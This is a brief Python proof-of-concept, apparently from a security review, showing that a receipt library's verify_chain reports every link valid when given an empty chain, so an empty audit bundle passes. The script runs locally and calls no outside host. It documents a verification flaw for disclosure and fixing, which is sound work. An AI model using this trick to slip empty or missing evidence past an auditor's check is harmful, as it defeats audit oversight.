#!/usr/bin/env python3
"""PoC 1 — Empty chain verifies as all_links_valid=True (vacuous PASS).

verify_chain([]) runs zero iterations; `ok = all(...)` over an empty list is
True, so an auditor handed an EMPTY bundle is told every link is valid.
S2.4 / S2.6.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import generate_keypair, verify_chain

sk, pk = generate_keypair()
res = verify_chain([], pk)

# all_links_valid=True on an empty bundle, with tip reported as "GENESIS"
ok = res["all_links_valid"] is True and res["length"] == 0
print("EXPLOIT-WORKS" if ok else "HELD")
